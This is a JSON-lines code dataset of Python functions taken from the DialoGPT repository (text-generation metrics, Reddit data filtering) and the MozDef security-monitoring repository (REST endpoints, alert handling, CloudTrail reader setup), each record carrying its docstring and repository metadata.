{"docstring": "'''\nCompute the cosine similarity of two vectors.\n:param vec_hyp: array of dictionary for vector corresponding to hypothesis\n:param vec_ref: array of dictionary for vector corresponding to reference\n:param norm_hyp: array of float for vector corresponding to hypothesis\n:param norm_ref: array of float for vector corresponding to reference\n:param length_hyp: int containing length of hypothesis\n:param length_ref: int containing length of reference\n:return: array of score for each n-grams cosine similarity\n'''\n", "func_signal": "def sim(vec_hyp, vec_ref, norm_hyp, norm_ref, length_hyp, length_ref):\n", "code": "delta = float(length_hyp - length_ref)\n# measure consine similarity\nval = np.array([0.0 for _ in range(self.n)])\nfor n in range(self.n):\n    # ngram\n    for (ngram,count) in vec_hyp[n].items():\n        # vrama91 : added clipping\n        val[n] += min(vec_hyp[n][ngram], vec_ref[n][ngram]) * vec_ref[n][ngram]\n\n    if (norm_hyp[n] != 0) and (norm_ref[n] != 0):\n        val[n] /= (norm_hyp[n]*norm_ref[n])\n\n    assert(not math.isnan(val[n]))\n    # vrama91: added a length based gaussian penalty\n    val[n] *= np.e**(-(delta**2)/(2*self.sigma**2))\nreturn val", "path": "DialoGPT/pycocoevalcap/cider/cider_scorer.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "# use the same signature with eval_model_generation\n", "func_signal": "def eval_model_loss(model, tokenizer, eval_dataloader, epoch_id, args):\n", "code": "logger.info('compute eval model loss, using eval mode, '\n            'please change it back to train after calling this function')\nmodel.eval()\ntot_loss = []\ntot_ppl = []\ntot_sample = []\nwith torch.no_grad():\n    for step, batch in enumerate(eval_dataloader):\n        batch = tuple(t.to(args.device) for t in batch)\n        input_ids, position_ids, token_ids, label_ids, src_len, _ = batch\n        if args.no_token_id:\n            token_ids = None\n        n_sample = input_ids.shape[0]\n        loss, ppl = model(input_ids, position_ids, token_ids, label_ids)\n        tot_loss.append(loss.mean().item() * n_sample)\n        tot_ppl.append(ppl.mean().item() * n_sample)\n        tot_sample.append(n_sample)\nprint(f\"\\n Epoch {epoch_id}: Val loss {np.sum(tot_loss) / np.sum(tot_sample)} Val ppl {np.sum(tot_ppl) / np.sum(tot_sample)} \")\nreturn np.sum(tot_loss) / np.sum(tot_sample), np.sum(tot_ppl) / np.sum(tot_sample)", "path": "DialoGPT/gpt2_training/eval_utils.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "# Remove offensive words:\n", "func_signal": "def filter_instance(src, tgt, info):\n", "code": "if args.bl_words and not args.leaves_only:\n\tbad_words = bl_words.extract_keywords(tgt)\n\tif bad_words:\n\t\tprint(\"skip\\toffensive\\t%s\\t%s\\tbad word(s): %s\" % (info, tgt, bad_words), file=sys.stderr)\n\t\treturn True\n\n# Remove empty targets:\ntgttoks = tgt.split()\nif len(tgttoks) <= 1: # 1 means there is only a weight, and 0 means there's a bug..\n\tprint(\"skip\\temptytarget\\t%s\\t%s\" % (info, tgt), file=sys.stderr)\n\treturn True\n\n# Skip if word too long:\ntoolong = False\nfor w in tgttoks:\n\tif len(w) > 30:\n\t\ttoolong = True\n\t\tbreak\nif toolong:\n\tprint(\"skip\\tlongword\\t%s\\t%s\\tword too long\" % (info, tgt), file=sys.stderr)\n\treturn True\n\nsrctoks = src.split()\n# Remove empty sources: (should probably uncomment, but left for reproducibility)\n#if len(srctoks) <= 1: # 1 means there is only a weight, and 0 means there's a bug..\n#\tprint(\"skip\\temptysource\\t%s\\t%s\" % (info, src), file=sys.stderr)\n#\treturn True\n\n# Remove too long turns:\nnsrctgt = len(srctoks) + len(tgttoks)\nif nsrctgt > 200:\n\tprint(\"skip\\ttoolong\\t%s\\t%s\\tsrc+tgt too long, src=[%s]\" % (info, tgt, src), file=sys.stderr)\n\treturn True\n\n# Skip turns with URLs:\nsrctgt = src + \" \" + tgt\nif \"__url__\" in srctgt:\n\tprint(\"skip\\turl\\t%s\\t%s\\turl in tgt, or src =[%s]\" % (info, tgt, src), file=sys.stderr)\n\treturn True\n\n# Skip responses with meta data:\nif re.search(\"[\\[\\]\\(\\)]\", srctgt) != None:\n\tprint(\"skip\\ttags\\t%s\\t%s\\ttag in tgt (or src: [%s])\" % (info, tgt, src), file=sys.stderr)\n\treturn True\n\n# Skip yelling:\nif re.search(\"[A-Z]{5,}\", srctgt) != None:\n\tprint(\"skip\\tallcaps\\t%s\\t%s\\tall caps in tgt (or src: [%s])\" % (info, tgt, src), file=sys.stderr)\n\treturn True\n\n# Skip word repetitions:\nreps = False\nfor i in range(2, len(tgttoks)):\n\tif tgttoks[i-2] == tgttoks[i] and tgttoks[i-1] == tgttoks[i]:\n\t\treps = True\n\t\tbreak\nif reps:\n\tprint(\"skip\\trepetitions\\t%s\\t%s\\ttoo many repetitions\" % (info, tgt), file=sys.stderr)\n\treturn True\n\nreturn False", "path": "DialoGPT/reddit_extractor/src/reddit.py", "commit_date": "2020-01-20 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "# to avoid issue like this: https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse\n", "func_signal": "def str2bool(s):\n", "code": "if s.lower() in ['t','true','1','y']:\n\treturn True\nelif s.lower() in ['f','false','0','n']:\n\treturn False\nelse:\n\traise ValueError", "path": "DialoGPT/dstc/util.py", "commit_date": "2019-10-19 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "'''called by constructor and __iadd__ to avoid creating new instances.'''\n\n", "func_signal": "def cook_append(self, test, refs):\n", "code": "if refs is not None:\n    self.crefs.append(cook_refs(refs))\n    if test is not None:\n        self.ctest.append(cook_test(test)) ## N.B.: -1\n    else:\n        self.ctest.append(None) # lens of crefs and ctest have to match", "path": "DialoGPT/pycocoevalcap/cider/cider_scorer.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "'''add an instance (e.g., from another sentence).'''\n\n", "func_signal": "def __iadd__(self, other):\n", "code": "if type(other) is tuple:\n    ## avoid creating new CiderScorer instances\n    self.cook_append(other[0], other[1])\nelse:\n    self.ctest.extend(other.ctest)\n    self.crefs.extend(other.crefs)\n\nreturn self", "path": "DialoGPT/pycocoevalcap/cider/cider_scorer.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "# SCORE ||| reference 1 words ||| reference n words ||| hypothesis words\n", "func_signal": "def _stat(self, hypothesis_str, reference_list):\n", "code": "hypothesis_str = hypothesis_str.replace('|||','').replace('  ',' ')\nscore_line = ' ||| '.join(('SCORE', ' ||| '.join(reference_list), hypothesis_str))\nself.meteor_p.stdin.write('{}\\n'.format(score_line))\nreturn self.meteor_p.stdout.readline().strip()", "path": "DialoGPT/pycocoevalcap/meteor/meteor.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "# url and tag\n", "func_signal": "def gpt_norm_sentence(txt):\n", "code": "words = []\nfor word in txt.split():\n\tif word[0] == '#': # don't allow tag\n\t\tcontinue\n\ti = word.lower().find('http')\n\tif i >= 0:\n\t\tword = word[:i] + ' ' + '__url__'\n\twords.append(word.strip())\ntxt = ' '.join(words)\n\n# remove illegal char\ntxt = txt.replace(chr(92),'') # chr(92) = '\\'. as twitter has 'b\\/c' rather than 'b/c'\ntxt = txt.replace(\"b/c\",\"because\").replace('j/k','just kidding').replace('w/o','without').replace('w/','with')\ntxt = re.sub('__mention__','MENTION',txt)\ntxt = re.sub('__url__','URL',txt)\ntxt = re.sub(r\"[^A-Za-z0-9()\\[\\]:,.!?'\u201c\u201d ]\", \" \", txt)\ntxt = re.sub('MENTION','__mention__',txt)\ntxt = re.sub('URL','__url__',txt)\n\ntokenizer = TweetTokenizer(preserve_case=True)\ntxt = ' ' + ' '.join(tokenizer.tokenize(txt)) + ' '\n\n# remove un-necessary space\nreturn ' '.join(txt.split())", "path": "DialoGPT/reddit_extractor/src/reddit.py", "commit_date": "2020-01-20 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "# evaluate all systems (*.txt) in each folder `files`\n\n", "func_signal": "def eval_all_systems(files, path_report, keys, multi_ref, n_refs=6, n_lines=None, clean=False, vshuman=False):\n", "code": "with open(path_report, 'w') as f:\n\tf.write('\\t'.join(\n\t\t\t['fname', 'n_lines'] + \\\n\t\t\t['nist%i'%i for i in range(1, 4+1)] + \\\n\t\t\t['bleu%i'%i for i in range(1, 4+1)] + \\\n\t\t\t['meteor'] + \\\n\t\t\t['entropy%i'%i for i in range(1, 4+1)] +\\\n\t\t\t['div1','div2','avg_len']\n\t\t) + '\\n')\n\nfor fl in files:\n\tif fl.endswith('.txt'):\n\t\tsubmitted = fl\n\t\tresults = eval_one_system(submitted, keys=keys, multi_ref=multi_ref, n_refs=n_refs, clean=clean, n_lines=n_lines, vshuman=vshuman, PRINT=False)\n\t\twith open(path_report, 'a') as f:\n\t\t\tf.write('\\t'.join(map(str, [submitted] + results)) + '\\n')\n\telse:\n\t\tfor fname in os.listdir(fl):\n\t\t\tif fname.endswith('.txt'):\n\t\t\t\tsubmitted = fl + '/' + fname\n\t\t\t\tresults = eval_one_system(submitted, keys=keys, multi_ref=multi_ref, n_refs=n_refs, clean=clean, n_lines=n_lines, vshuman=vshuman, PRINT=False)\n\t\t\t\twith open(path_report, 'a') as f:\n\t\t\t\t\tf.write('\\t'.join(map(str, [submitted] + results)) + '\\n')\n\nprint('report saved to: '+path_report, file=sys.stderr)", "path": "DialoGPT/dstc/dstc.py", "commit_date": "2019-10-19 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "\"\"\"\nComputes Rouge-L score given a set of reference and candidate sentences for the dataset\nInvoked by evaluate_captions.py \n:param hypo_for_image: dict : candidate / test sentences with \"image name\" key and \"tokenized sentences\" as values \n:param ref_for_image: dict : reference MS-COCO sentences with \"image name\" key and \"tokenized sentences\" as values\n:returns: average_score: float (mean ROUGE-L score computed by averaging scores for all the images)\n\"\"\"\n", "func_signal": "def compute_score(self, gts, res):\n", "code": "assert(gts.keys() == res.keys())\nimgIds = gts.keys()\n\nscore = []\nfor id in imgIds:\n    hypo = res[id]\n    ref  = gts[id]\n\n    score.append(self.calc_score(hypo, ref))\n\n    # Sanity check.\n    assert(type(hypo) is list)\n    assert(len(hypo) == 1)\n    assert(type(ref) is list)\n    assert(len(ref) > 0)\n\naverage_score = np.mean(np.array(score))\nreturn average_score, np.array(score)", "path": "DialoGPT/pycocoevalcap/rouge/rouge.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "''' copy the refs.'''\n", "func_signal": "def copy(self):\n", "code": "new = CiderScorer(n=self.n)\nnew.ctest = copy.copy(self.ctest)\nnew.crefs = copy.copy(self.crefs)\nreturn new", "path": "DialoGPT/pycocoevalcap/cider/cider_scorer.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "# compute idf\n", "func_signal": "def compute_score(self, option=None, verbose=0):\n", "code": "self.compute_doc_freq()\n# assert to check document frequency\nassert(len(self.ctest) >= max(self.document_frequency.values()))\n# compute cider score\nscore = self.compute_cider()\n# debug\n# print score\nreturn np.mean(np.array(score)), np.array(score)", "path": "DialoGPT/pycocoevalcap/cider/cider_scorer.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "\"\"\"\nFunction maps counts of ngram to vector of tfidf weights.\nThe function returns vec, an array of dictionary that store mapping of n-gram and tf-idf weights.\nThe n-th entry of array denotes length of n-grams.\n:param cnts:\n:return: vec (array of dict), norm (array of float), length (int)\n\"\"\"\n", "func_signal": "def counts2vec(cnts):\n", "code": "vec = [defaultdict(float) for _ in range(self.n)]\nlength = 0\nnorm = [0.0 for _ in range(self.n)]\nfor (ngram,term_freq) in cnts.items():\n    # give word count 1 if it doesn't appear in reference corpus\n    df = np.log(max(1.0, self.document_frequency[ngram]))\n    # ngram index\n    n = len(ngram)-1\n    # tf (term_freq) * idf (precomputed idf) for n-grams\n    vec[n][ngram] = float(term_freq)*(self.ref_len - df)\n    # compute norm for the vector.  the norm will be used for computing similarity\n    norm[n] += pow(vec[n][ngram], 2)\n\n    if n == 1:\n        length += term_freq\nnorm = [np.sqrt(n) for n in norm]\nreturn vec, norm, length", "path": "DialoGPT/pycocoevalcap/cider/cider_scorer.py", "commit_date": "2019-10-13 00:00:00", "repo_name": "microsoft/DialoGPT", "stars": 2301, "license": "mit", "language": "python", "size": 45751}
{"docstring": "# output our log to stdout or syslog\n", "func_signal": "def initConfig():\n", "code": "options.output = getConfig('output', 'stdout', options.configfile)\noptions.sysloghostname = getConfig('sysloghostname', 'localhost', options.configfile)\noptions.syslogport = getConfig('syslogport', 514, options.configfile)\noptions.esservers = list(getConfig('esservers',\n                                   'http://localhost:9200',\n                                   options.configfile).split(','))\n\n# mongo connectivity options\noptions.mongohost = getConfig('mongohost', 'localhost', options.configfile)\noptions.mongoport = getConfig('mongoport', 3001, options.configfile)\n\noptions.listen_host = getConfig('listen_host', '127.0.0.1', options.configfile)\n\ndefault_user_agent = 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/58.0'\noptions.user_agent = getConfig('user_agent', default_user_agent, options.configfile)", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "\"\"\"Create a 'Duplicate Chain', linking information about alerts being\nhandled by the Triage Bot so that a user's response to a message about\none alert can be replicated against duplicate alerts without sending\nmultiple messages.\n\nRequests are expected to take the following (JSON) form:\n\n```\n{\n    \"alert\": str,\n    \"user\": str,\n    \"identifiers\": List[str]\n}\n```\n\nWhere:\n    * `\"alert\"` is the \"label\" for the alert, signifying which of the\n    supported alerts is being triaged.\n    * `\"user\"` is the email address of the user contacted.\n    * `\"identifier\"` is a list of ElasticSearch IDs of alerts of the\n    same kind triggered by the same user.\n\nThis function writes back a response containing the following JSON.\n\n```\n{\n    \"error\": Optional[str]\n}\n```\n\nIf an error occurs, a duplicate chain will not be created and an error\nstring will be returned.  Otherwise, the `error` field will be `null.`\n\"\"\"\n\n", "func_signal": "def create_duplicate_chain():\n", "code": "initConfig()\n\nmongo = MongoClient(options.mongohost, options.mongoport)\ndupchains = mongo.meteor[DUP_CHAIN_DB]\n\ntry:\n    req = request.json\nexcept bottle.HTTPError:\n    response.status = StatusCode.BAD_REQUEST\n    return {\"error\": \"Missing or invalid request body\"}\n\nnow = datetime.utcnow()\n\nchain = {\n    \"alert\": req.get(\"alert\"),\n    \"user\": req.get(\"user\"),\n    \"identifiers\": req.get(\"identifiers\", []),\n    \"created\": now,\n    \"modified\": now,\n}\n\nif chain[\"alert\"] is None or chain[\"user\"] is None:\n    response.status = StatusCode.BAD_REQUEST\n    return {\n        \"error\": \"Request missing required key `alert` or `user`\"\n    }\n\nresult = dupchains.insert_one(chain)\nif not result.acknowledged:\n    response.status = StatusCode.INTERNAL_ERROR\n    return {\"error\": \"Failed to store new duplicate chain\"}\n\nresponse.status = StatusCode.OK\nreturn {\"error\": None}", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "# This value controls how long we sleep\n# between reauthenticating and getting a new set of creds\n# eventually this gets set by aws response\n", "func_signal": "def authenticate(self):\n", "code": "self.flush_wait_time = 1800\nif options.cloudtrail_arn not in [\"<cloudtrail_arn>\", \"cloudtrail_arn\"]:\n    client = boto3.client(\"sts\", aws_access_key_id=options.accesskey, aws_secret_access_key=options.secretkey)\n    response = client.assume_role(RoleArn=options.cloudtrail_arn, RoleSessionName=\"MozDef-CloudTrail-Reader\")\n    role_creds = {\n        \"aws_access_key_id\": response[\"Credentials\"][\"AccessKeyId\"],\n        \"aws_secret_access_key\": response[\"Credentials\"][\"SecretAccessKey\"],\n        \"aws_session_token\": response[\"Credentials\"][\"SessionToken\"],\n    }\n    current_time = toUTC(datetime.now())\n    # Let's remove 3 seconds from the flush wait time just in case\n    self.flush_wait_time = (response[\"Credentials\"][\"Expiration\"] - current_time).seconds - 3\nelse:\n    role_creds = {}\nrole_creds[\"region_name\"] = options.region\nself.s3_client = boto3.client(\"s3\", **get_aws_credentials(**role_creds))", "path": "MozDef/mq/esworker_cloudtrail.py", "commit_date": "2020-02-12 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "'''return a json version of whois for an ip address'''\n", "func_signal": "def index():\n", "code": "if request.body:\n    arequest = request.body.read()\n    request.body.close()\n# valid json?\ntry:\n    requestDict = json.loads(arequest)\nexcept ValueError:\n    response.status = 500\n\nif 'ipaddress' in requestDict and isIPv4(requestDict['ipaddress']):\n    response.content_type = \"application/json\"\n    response.body = getWhois(requestDict['ipaddress'])\nelse:\n    response.status = 500\n\nsendMessgeToPlugins(request, response, 'ipwhois')\nreturn response", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "''' cors decorator for rest/ajax'''\n", "func_signal": "def enable_cors(fn):\n", "code": "def _enable_cors(*args, **kwargs):\n    # set CORS headers\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, OPTIONS'\n    response.headers['Access-Control-Allow-Headers'] = 'Origin, Accept, Content-Type, X-Requested-With, X-CSRF-Token'\n\n    if bottle.request.method != 'OPTIONS':\n        # actual request; reply with the actual response\n        return fn(*args, **kwargs)\n\nreturn _enable_cors", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "'''an endpoint to return alert schedules'''\n", "func_signal": "def index():\n", "code": "if request.body:\n    request.body.read()\n    request.body.close()\nresponse.content_type = \"application/json\"\nmongoclient = MongoClient(options.mongohost, options.mongoport)\nschedulers_db = mongoclient.meteor['alertschedules'].with_options(codec_options=CodecOptions(tz_aware=True))\n\nmongodb_alerts = schedulers_db.find()\nalert_schedules_dict = {}\nfor mongodb_alert in mongodb_alerts:\n    if mongodb_alert['last_run_at']:\n        mongodb_alert['last_run_at'] = mongodb_alert['last_run_at'].isoformat()\n    if 'modifiedat' in mongodb_alert:\n        mongodb_alert['modifiedat'] = mongodb_alert['modifiedat'].isoformat()\n    alert_schedules_dict[mongodb_alert['name']] = mongodb_alert\n\nresponse.body = json.dumps(alert_schedules_dict)\nresponse.status = 200\nreturn response", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "# connect and declare the message queue/kombu objects.\n# Event server/exchange/queue\n", "func_signal": "def main():\n", "code": "mqConnString = 'amqp://{0}:{1}@{2}:{3}//'.format(\n    options.mquser,\n    options.mqpassword,\n    options.mqalertserver,\n    options.mqport\n)\nmqAlertConn = Connection(mqConnString)\n\n# Exchange for alerts we pass to actions\nalertExchange = Exchange(name=options.alertExchange,\n                         type='topic',\n                         durable=True,\n                         delivery_mode=1)\n\nalertExchange(mqAlertConn).declare()\n\n# Queue for the exchange\nalertQueue = Queue(options.queueName,\n                   exchange=alertExchange,\n                   routing_key=options.alerttopic,\n                   durable=False,\n                   no_ack=(not options.mqack))\nalertQueue(mqAlertConn).declare()\n\n# consume our alerts.\nalertConsumer(mqAlertConn, alertQueue, alertExchange).run()", "path": "MozDef/alerts/alert_actions_worker.py", "commit_date": "2019-08-01 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "'''walk the plugins directory\n   and register modules in pluginList\n   as a tuple: (mfile, mname, mdescription, mreg, mpriority, mclass)\n'''\n\n", "func_signal": "def registerPlugins():\n", "code": "plugin_location = os.path.join(os.path.dirname(__file__), \"plugins\")\nmodule_name = os.path.basename(plugin_location)\nroot_plugin_directory = os.path.join(plugin_location, '..')\n\nplugin_manager = pynsive.PluginManager()\nplugin_manager.plug_into(root_plugin_directory)\n\nif os.path.exists(plugin_location):\n    modules = pynsive.list_modules(module_name)\n    for mfile in modules:\n        module = pynsive.import_module(mfile)\n        importlib.reload(module)\n        if not module:\n            raise ImportError('Unable to load module {}'.format(mfile))\n        else:\n            if 'message' in dir(module):\n                mclass = module.message()\n                mreg = mclass.registration\n                mclass.restoptions = options.__dict__\n\n                if 'priority' in dir(mclass):\n                    mpriority = mclass.priority\n                else:\n                    mpriority = 100\n                if 'name' in dir(mclass):\n                    mname = mclass.name\n                else:\n                    mname = mfile\n\n                if 'description' in dir(mclass):\n                    mdescription = mclass.description\n                else:\n                    mdescription = mfile\n\n                if isinstance(mreg, list):\n                    logger.info('[*] plugin {0} registered to receive messages from /{1}'.format(mfile, mreg))\n                    pluginList.append((mfile, mname, mdescription, mreg, mpriority, mclass))", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "'''endpoint for grabbing watchlist contents'''\n", "func_signal": "def status():\n", "code": "if request.body:\n    request.body.read()\n    request.body.close()\nresponse.status = 200\nresponse.content_type = \"application/json\"\nresponse.body = getWatchlist()\nreturn response", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "\"\"\"Update a `DuplicateChain`, appending information about a new alert\ndestined for a Slack user via the triage Bot.\nSee `create_duplicate_chain` for more information.\n\nRequests are expected to take the following (JSON) form:\n\n```\n{\n    \"alert\": str,\n    \"user\": str,\n    \"identifiers\": List[str]\n}\n```\n\nThe parameters are the same as those of `create_duplicate_chain`.\n\nThis function writes back a response containing the following JSON.\n\n```\n{\n    \"error\": Optional[str]\n}\n```\n\nIf an error occurs, no duplicate chains will be updated.  This endpoint\ndoes not create a new chain if one does not already exist.\n\"\"\"\n\n", "func_signal": "def update_duplicate_chain():\n", "code": "initConfig()\n\nmongo = MongoClient(options.mongohost, options.mongoport)\ndupchains = mongo.meteor[DUP_CHAIN_DB]\n\ntry:\n    req = request.json\nexcept bottle.HTTPError:\n    response.status = StatusCode.BAD_REQUEST\n    return {\"error\": \"Missing or invalid request body\"}\n\nquery = {\"alert\": req.get(\"alert\"), \"user\": req.get(\"user\")}\n\nnew_ids = req.get(\"identifiers\")\n\nif any([x is None for x in (query[\"alert\"], query[\"user\"], new_ids)]):\n    response.status = StatusCode.BAD_REQUEST\n    return {\n        \"error\": \"Request missing required key `alert`, `user` or \"\n        \"`identifiers`\"\n    }\n\nchain = dupchains.find_one(query)\n\nif chain is None:\n    response.status = StatusCode.BAD_REQUEST\n    return {\"error\": \"Duplicate chain does not exist\"}\n\nmodified = dupchains.update_one(\n    query,\n    {\n        \"$set\": {\n            \"identifiers\": chain[\"identifiers\"] + new_ids,\n            \"modified\": datetime.utcnow(),\n        }\n    },\n).modified_count\n\nif modified != 1:\n    response.status = StatusCode.INTERNAL_ERROR\n    return {\"error\": \"Failed to update chain\"}\n    return response\n\nresponse.status = StatusCode.OK\nreturn {\"error\": None}", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "'''\ntakes an incoming message\nand sets the type field\n'''\n\n", "func_signal": "def __init__(self):\n", "code": "self.registration = ['netflow']\nself.priority = 5", "path": "MozDef/mq/plugins/netflowFixup.py", "commit_date": "2019-08-01 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "'''Write the self.data value into the state file'''\n", "func_signal": "def save(self):\n", "code": "with open(self.filename, 'w') as f:\n    json.dump(self.data, f, sort_keys=True, indent=4, separators=(',', ': '))", "path": "MozDef/mozdef_util/mozdef_util/state.py", "commit_date": "2018-10-16 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "\"\"\"Deletes a Duplicate Chain tracking duplicate alerts triggered by the\nsame user.\n\nRequests are expected to contain the following JSON data:\n\n```\n{\n    \"alert\": str,\n    \"user\": str\n}\n```\n\nWhere:\n    * `\"alert\"` is the label of an alert supported by the triage bot.\n    * `\"user\"` is the email address of the user the triage bot contacted.\n\nResponses will contain the following JSON:\n\n```\n{\n    \"error\": Optional[str]\n}\n```\n\nIn the case that a duplicate chain identified by the request parameters does\nnot exist or an error occurs in deleting it, the `\"error\"` field will\ncontain a string describing the error.  Otherwise, it is `null`.\n\"\"\"\n\n", "func_signal": "def delete_duplicate_chain():\n", "code": "initConfig()\n\nmongo = MongoClient(options.mongohost, options.mongoport)\ndupchains = mongo.meteor[DUP_CHAIN_DB]\n\ntry:\n    req = request.json\nexcept bottle.HTTPError:\n    response.status = StatusCode.BAD_REQUEST\n    return {\"error\": \"Missing or invalid request body\"}\n\nquery = {\"alert\": req.get(\"alert\"), \"user\": req.get(\"user\")}\n\nif query[\"alert\"] is None or query[\"user\"] is None:\n    response.status = StatusCode.BAD_REQUEST\n    return {\n        \"error\": \"Request missing required key `alert` or `user`\"\n    }\n\nresult = dupchains.delete_one(query)\n\nif not result.acknowledged:\n    response.status = StatusCode.BAD_REQUEST\n    return {\"error\": \"No such duplicate chain exists\"}\n\nresponse.status = StatusCode.OK\nreturn {\"error\": None}", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "\"\"\"Search for a `Duplicate Chain` storing information about duplicate\nalerts triggered by the same user's activity.  These chains track such\nduplicate alerts so that the triage bot does not have to message a user\non Slack for each such alert within some period of time.\n\nRequests are expected to include the following query parameters.\n\n    * `\"alert\": str` is the \"label\" for the alert, signifying which of the\n    supported alerts the user in question triggered.\n    * `\"user\": str` is the email address of the user contacted.\n\nThis function writes back a response containing the following JSON.\n\n```\n{\n    \"error\": Optional[str],\n    \"identifiers\": List[str],\n    \"created\": str,\n    \"modified\": str\n}\n```\n\nHere,\n    * `\"error\"` will contain a string message if any error occurs performing\n    a lookup.  If such an error occurs, `\"identifiers\"` will be an empty\n    list.\n    * `\"identifiers\"` is a list of IDs of alerts stored under the chain.\n    * `\"created\"` is the date & time at which the chain was created.\n    * `\"modified\"` is the date & time at which the chain was last modified.\n\nBoth the `\"created\"` and `\"modified\"` fields represent UTC timestamps and\nare formatted like `YYYY/mm/dd HH:MM:SS`.\n\"\"\"\n\n", "func_signal": "def retrieve_duplicate_chain():\n", "code": "initConfig()\n\nmongo = MongoClient(options.mongohost, options.mongoport)\ndupchains = mongo.meteor[DUP_CHAIN_DB]\n\ndef _error(msg):\n    return json.dumps({\n        \"error\": msg,\n        \"identifiers\": [],\n        \"created\": toUTC(datetime.utcnow()).isoformat(),\n        \"modified\": toUTC(datetime.utcnow()).isoformat(),\n    })\n\nquery = {\"alert\": request.query.alert, \"user\": request.query.user}\n\nif query.get(\"alert\", \"\") == \"\" or query.get(\"user\", \"\") == \"\":\n    response.status = StatusCode.BAD_REQUEST\n    response.body = _error(\"Request missing `alert` or `user` field\")\n    return response\n\nchain = dupchains.find_one(query)\n\nif chain is None:\n    # This is not an error, but we do want to write an empty response.\n    response.status = StatusCode.OK\n    response.body = _error(\"Did not find requested duplicate chian\")\n    return response\n\nresponse.status = StatusCode.OK\nreturn {\n    \"error\": None,\n    \"identifiers\": chain[\"identifiers\"],\n    \"created\": toUTC(chain[\"created\"]).isoformat(),\n    \"modified\": toUTC(chain[\"modified\"]).isoformat(),\n}", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "\"\"\"open or re-open a connection to elastic search\"\"\"\n", "func_signal": "def esConnect():\n", "code": "return ElasticsearchClient(\n    (list(\"{0}\".format(s) for s in options.esservers)),\n    bulk_amount=options.esbulksize,\n    bulk_refresh_time=options.esbulktimeout,\n)", "path": "MozDef/mq/esworker_cloudtrail.py", "commit_date": "2020-02-12 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
